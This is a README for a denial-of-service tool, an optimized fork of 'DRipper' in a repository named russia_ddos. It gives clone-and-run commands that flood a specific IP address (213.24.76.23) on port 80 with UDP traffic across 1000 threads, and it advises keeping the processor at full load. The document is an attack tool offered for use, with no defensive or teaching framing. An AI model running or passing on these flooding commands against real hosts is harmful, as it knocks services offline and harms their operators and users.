## Description

This is an optimized version of DRipper. Here is original code: https://gist.github.com/scamp/33807688d0ebdcfbd4c29a4b992a8b54, you can see there a lot of cons like extra requests to Facebook and validator.w3.com, trying establishing connection with attacked resource (but there is no need in it if you want to send a UDP packet). Also the old version is inefficient: you need run several processes to have your processor busy.


## Usage
Ensure you have Python 3 installed. Then clone this repo and run main.py with params you need:

-s - IP;

-p - port (default 80);

-t - threads count. The most important setting. Try to keep the processor busy up to 100%.

```bash
git clone https://github.com/alexmon1989/russia_ddos.git
cd russia_ddos

# run
python -u main.py -s 213.24.76.23 -p 80 -t 1000
# OR
python3 -u main.py -s 213.24.76.23 -p 80 -t 1000
```
